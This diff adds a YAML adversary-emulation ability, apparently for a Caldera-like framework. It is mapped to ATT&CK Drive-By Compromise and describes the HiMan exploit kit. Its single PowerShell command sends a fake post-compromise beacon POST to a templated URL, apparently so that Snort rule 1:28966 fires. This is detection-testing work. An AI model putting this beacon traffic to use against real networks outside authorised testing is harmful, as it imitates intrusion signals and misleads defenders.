@@ -1,0 +1,39 @@
+- tactic: initial-access
+  technique_name: Drive-By Compromise
+  technique_id: T1189
+  name: 'Intrusion: HiMan exploit kit outbound POST connection'
+  description: "Adversaries exploit the HiMan exploit kit by luring victims to malicious\
+    \ or compromised websites, often through malvertising or phishing. Once visited,\
+    \ the site silently fingerprints the user\u2019s system and delivers tailored\
+    \ exploits for unpatched vulnerabilities in browsers or plugins like Java or Flash.\
+    \ If successful, the exploit executes a payload\u2014such as a remote access trojan\
+    \ or infostealer\u2014without user interaction. The infected host then sends a\
+    \ distinct HTTP POST request back to the attacker\u2019s server, signaling a successful\
+    \ compromise. This outbound traffic, detected by Snort rule SID 1:28966, marks\
+    \ the final stage of a classic drive-by compromise attack."
+  executors:
+  - name: psh
+    platform: windows
+    command: Invoke-WebRequest -Uri "#{ignite.url}/exploit" -Method POST -Body "hyt=abc&vre=1.2.3"
+      -ContentType "application/x-www-form-urlencoded"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 10
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - initial-access
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 1f7e683f-f7e8-4ae7-a0e1-f1bcbe22e468
